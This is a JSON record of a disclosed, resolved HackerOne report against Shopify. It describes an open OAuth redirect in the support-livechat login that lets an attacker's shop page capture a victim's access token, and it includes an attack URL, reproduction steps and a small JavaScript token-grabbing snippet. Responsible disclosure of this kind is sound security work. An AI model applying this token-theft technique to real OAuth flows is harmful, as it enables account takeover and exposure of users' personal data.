{
  "id": 151058,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTEwNTg=",
  "url": "https://hackerone.com/reports/151058",
  "title": "Stealing livechat token and using it to chat as the user - user information disclosure ",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-07-13T06:15:51.924Z",
  "submitted_at": "2016-07-13T06:15:51.924Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "zombiehelp54",
    "url": "/zombiehelp54",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/mevfgipw1pc7n4wy86swdq1yaeuq/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-07-19T00:53:07.236Z",
  "bug_reporter_agreed_on_going_public_at": "2016-07-19T00:53:07.044Z",
  "team_member_agreed_on_going_public_at": "2016-07-18T23:30:47.186Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi , I have found an issue through which an attacker can steal users' livechat access token and use it to login and chat with the support agents as them , he also will be able to get access to sensitive user information such as his email and his first name and last name.\n#Details: \nWhen you go to https://support.shopify.com/ , if you click the **Open Chat** button at the bottom of the page, you'll be asked to authenticate using your shop. \nWhen you click the **authenticate** button , you'll go to this link: \n```\nhttps://tasker-merchant-auth.herokuapp.com/auth/shopify/?utf8=%E2%9C%93&auth_type=chat&return_to=https%3A%2F%2Flivechat.shopify.com%2Fcustomer%2Fchats%2Fnew&shop=<shop>.myshopify.com\n```\nThe problem is that you have configured your oauth redirect_uri (the `return_to` parameter ) to accept any link like this: \n- <anything>.shopify.com/\n- <anything>.myshopify.com/\n\nWhich means that an attacker can set the redirect URI to something like: \n```\nhttps://tasker-merchant-auth.herokuapp.com/auth/shopify/?utf8=%E2%9C%93&auth_type=chat&return_to=https://<attacker_shop>.myshopify.com/&shop=<victim_shop>.myshopify.com\n```\nAnd send the link to the victim and when his victim opens it , he will be redirected to `https://<attacker_shop>.myshopify.com/?auth_code=<access_token>` and since the attacker has full control over the HTML and JavaScript of `<attacker_shop>.myshopify.com` , he can use JavaScript to fetch the returned access token and save it anywhere. \n\nThen the attacker can use that access token to login as the user's shop in livechat.shopify.com by going to \n`https://livechat.shopify.com/customer/chats/new?auth_code=<access_token>&auth_type=chat` \nAfter that the attacker can know the first name and the email of the victim by checking the page source code.\nThey will be stored as: \n```javascript\nvar chat = new TC.CustomerChat({\n      chat: {\"id\":\"<id>\",\"token\":\"<chat_token>\",\"name\":\"<user_first_and_last_name>\",\"email\":\"<user_email>\",\"metadata\": \"<other_meta_data>\"},\n      host: \"livechat.shopify.com\",\n      role: \"customer\",\n      eventChannel: eventChannel,\n      pusher: new Pusher(\"c7e0a5a73ab848bea519\")\n    });\n```\n#Steps to reproduce:\n1. Go to: ` https://tasker-merchant-auth.herokuapp.com/auth/shopify/?utf8=%E2%9C%93&auth_type=chat&return_to=https://zh5401.myshopify.com/&shop=<your_shop>.myshopify.com `\n2. If you haven't authorized Shopify support before , you'll be asked to grant access and if you have already done that before , you'll be automatically redirected to `https://zh5401.myshopify.com/?auth_code=<access_token>&auth_type=chat` \n3. You'll see your access token in an alert box and it will be written to the DOM , copy that access token and open a new browser then go to  `https://livechat.shopify.com/customer/chats/new?auth_code=<access_token>&auth_type=chat`  \n4. You'll be able to login to livechat , to see your email and name , view the page source then look for `TC.CustomerChat` \n\nCode used in `https://zh5401.myshopify.com` to fetch the `auth_code`: \n```html\n<script>\n var token = window.location.search.match(/auth_code=([^&]+)/);\n      if (token && token.length > 1) {\n        alert(\"Your access token is: \" + token[1]);\n        document.write(\"Attacker can use it to chat with support agents as you and he will be able to get your email <br> <b>Go to https://livechat.shopify.com/customer/chats/new?auth_type=chat&auth_code=\" + token[1]);\n      }\n\n</script>\n```\n\n#Impact:\nThere are two impacts here , one is chatting with support agents as another user which may lead to a lot of problems. The other is getting sensitive information about the user such as his email and full name. \n\nThanks! \n",
  "weakness": {
    "id": 27,
    "name": "Improper Authentication - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 67,
  "voters": [
    "drsniper",
    "bogdantcaciuc",
    "hunter",
    "michiel",
    "metawolf",
    "yaworsk",
    "lucky_sen",
    "vijay_kumar",
    "jimeno",
    "dilawer",
    "and 57 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
